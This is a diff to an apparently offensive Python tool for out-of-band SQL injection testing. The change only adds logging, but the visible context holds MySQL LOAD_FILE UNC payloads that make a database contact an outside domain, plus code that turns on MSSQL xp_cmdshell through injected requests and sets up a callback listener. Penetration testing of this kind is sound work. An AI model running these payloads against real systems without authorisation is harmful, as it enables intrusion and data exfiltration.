@@ -3,6 +3,10 @@ from typing import Optional, Dict
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import requests
 
+from tools.log_utils import get_logger
+
+logger = get_logger("sqli_oob")
+
 OOB_PAYLOADS = {
     "mysql_dns": "LOAD_FILE('\\\\%s\\file')",
     "mysql_unc": "SELECT LOAD_FILE('\\\\%s\\test')",
@@ -81,8 +85,8 @@ class SQLiOOB:
                               timeout=self.timeout, verify=False)
                 result["findings"].append({"type": payload_type, "payload": payload[:50]})
                 result["vulnerable"] = True
-            except:
-                pass
+            except Exception as e:
+                logger.debug("oob test %s: %s", payload_type, e)
         return result
 
     def test_xp_cmdshell(self, url: str, param: str, oob_domain: str) -> Dict:
@@ -96,8 +100,8 @@ class SQLiOOB:
                 self.sess.get("%s%s%s=%s" % (url, sep, param, cmd),
                               timeout=self.timeout, verify=False)
                 result["findings"].append({"cmd": cmd[:40]})
-            except:
-                pass
+            except Exception as e:
+                logger.debug("xp enable: %s", e)
         test_payload = OOB_PAYLOADS["mssql_xp_cmdshell"] % oob_domain
         try:
             sep = "&" if "?" in url else "?"
@@ -105,8 +109,8 @@ class SQLiOOB:
                           timeout=self.timeout, verify=False)
             result["vulnerable"] = True
             result["findings"].append({"xp_cmdshell": test_payload[:40]})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("xp cmdshell: %s", e)
         return result
 
     def start_listener(self, port: int = 9999) -> None:
